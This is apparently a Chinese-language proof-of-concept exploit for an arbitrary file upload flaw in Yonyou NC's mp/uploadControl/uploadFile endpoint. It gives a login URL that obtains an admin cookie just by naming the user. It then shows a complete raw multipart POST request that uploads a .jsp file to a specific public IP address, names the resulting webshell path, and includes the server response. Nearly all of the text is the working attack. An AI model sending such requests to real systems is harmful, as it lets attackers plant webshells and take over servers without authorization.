# 用友 NC uploadControl uploadFile 任意文件上传

    ## poc

先获取 cookie:url+/mp/loginxietong?username=admin

Webshell 地址 

http://61.128.134.135:888/mp/uploadFileDir/1.jsp

```
POST /mp/uploadControl/uploadFile HTTP/1.1
Host: 61.128.134.135:888
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: JSESSIONID=6F41F923A7E85685A435333DBCDBCCF0.ncMem03; mp_name=admin; JSESSIONID=B3E9947D5D6D74A42C454FE040EC22D8.ncMem03
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryoDIsCqVMmF83ptmp 
Connection: close
Content-Length: 308

------WebKitFormBoundaryoDIsCqVMmF83ptmp
Content-Disposition: form-data; name="file"; filename="1.jsp"
Content-Type: application/octet-stream

Hello Administrator!
------WebKitFormBoundaryoDIsCqVMmF83ptmp
Content-Disposition: form-data; name="submit"

上传
------WebKitFormBoundaryoDIsCqVMmF83ptmp



HTTP/1.1 200 OK
Date: Fri, 18 Aug 2023 08:05:11 GMT
Server: Apache/2.4.51 (Win64) OpenSSL/1.1.1l mod_jk/1.2.40
Upgrade: h2,h2c
Connection: Upgrade, close
Content-Length: 33
Content-Type: text/html;charset=utf-8

{"forbidden":true,"msg":"null"}

```
